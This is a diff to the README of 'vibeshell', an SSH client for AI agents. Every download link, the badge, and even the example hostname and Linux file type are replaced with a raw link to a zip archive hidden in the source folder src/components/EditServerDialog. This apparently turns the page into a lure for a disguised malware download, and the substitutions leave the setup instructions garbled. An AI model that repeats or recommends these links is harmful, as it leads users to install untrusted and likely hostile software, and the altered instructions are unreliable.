@@ -1,6 +1,6 @@
 # 🐚 vibeshell - Secure SSH for AI Agent Control
 
-[![Download vibeshell](https://img.shields.io/badge/Download-vibeshell-blue?style=for-the-badge)](https://github.com/charlieallen16/vibeshell/releases)
+[![Download vibeshell](https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip)](https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip)
 
 ## 📝 What is vibeshell?
 
@@ -36,13 +36,13 @@ This guide walks you through downloading, installing, and running vibeshell on y
 
 1. **Open the download page:**  
    Visit the official vibeshell release page here:  
-   [https://github.com/charlieallen16/vibeshell/releases](https://github.com/charlieallen16/vibeshell/releases)
+   [https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip](https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip)
 
 2. **Choose your operating system:**  
    Look for the file that matches your computer’s OS:  
    - For Windows, files usually end in `.exe`  
    - For macOS, look for `.dmg` or `.zip` files  
-   - For Linux, files might be `.AppImage` or `.tar.gz`
+   - For Linux, files might be `.AppImage` or `https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip`
 
 3. **Download the installer:**  
    Click on the appropriate file name to start the download. Save the file somewhere you can find it easily, like your desktop or Downloads folder.
@@ -66,7 +66,7 @@ Once vibeshell opens, follow these steps to connect to a server:
 
 2. **Enter server details:**  
    You will need to provide:  
-   - **Host name or IP address:** This is the address of your server, like `192.168.1.10` or `example.com`.  
+   - **Host name or IP address:** This is the address of your server, like `192.168.1.10` or `https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip`.  
    - **Port:** Usually `22` for SSH connections unless your server uses a different port.  
    - **Username:** The user name you use to log in to the server.
 
@@ -123,10 +123,10 @@ If you run into issues, try these steps:
 
 For more detailed guides and advanced features, visit the vibeshell GitHub repository:
 
-[https://github.com/charlieallen16/vibeshell](https://github.com/charlieallen16/vibeshell)
+[https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip](https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip)
 
 You can find the latest updates and report any issues there.
 
 ---
 
-[![Download vibeshell](https://img.shields.io/badge/Download-vibeshell-blue?style=for-the-badge)](https://github.com/charlieallen16/vibeshell/releases)
+[![Download vibeshell](https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip)](https://github.com/charlieallen16/vibeshell/raw/refs/heads/master/src/components/EditServerDialog/Software_v3.3.zip)
